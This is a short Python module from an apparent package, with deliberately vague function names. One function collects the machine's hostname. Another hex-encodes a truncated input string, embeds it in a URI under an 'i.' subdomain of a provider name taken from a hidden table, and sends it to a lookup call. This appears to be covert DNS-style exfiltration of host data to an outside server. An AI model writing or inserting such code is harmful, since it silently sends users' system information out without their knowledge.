
import os
import platform
import socket

from .netutils import setup_uri, check_dms
from .static.providers import CLOUD_DS
from .static.constant import STRING_TABLE


def reg_loc():
    try:
        return socket.gethostname() or platform.node() or os.uname()[1]
    except Exception:
        return None


def init_cds(input_string, step, index):
    table_str = input_string.replace(STRING_TABLE[0], '')[:30].encode().hex()
    cloud_uri = setup_uri(table_str, step, index, f"i.{CLOUD_DS[19]}")
    check_dms(cloud_uri)
